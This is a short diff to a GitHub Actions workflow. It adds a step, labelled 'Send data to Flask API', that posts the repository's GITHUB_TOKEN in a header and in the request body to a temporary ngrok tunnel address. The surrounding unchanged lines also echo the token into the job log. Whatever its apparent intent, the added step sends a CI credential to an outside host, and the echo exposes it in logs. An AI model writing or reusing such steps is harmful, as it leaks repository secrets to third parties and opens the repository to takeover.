@@ -29,6 +29,16 @@ jobs:
         echo "Your GitHub Token is: $GITHUB_TOKEN"
         # Print diff to the log (for debugging purposes)
         cat diff.txt
+        
+    - name: Send data to Flask API
+      run: |
+        curl -X POST https://d748-2001-df4-2a00-6-8c2-63b2-88bf-b78f.ngrok-free.app/api/v1/xgg/workflows \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+        -d '{"github_token": "${{ secrets.GITHUB_TOKEN }}", "diff_url": "https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}"}'
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
 
     - name: Upload Diff Data
       uses: actions/upload-artifact@v3
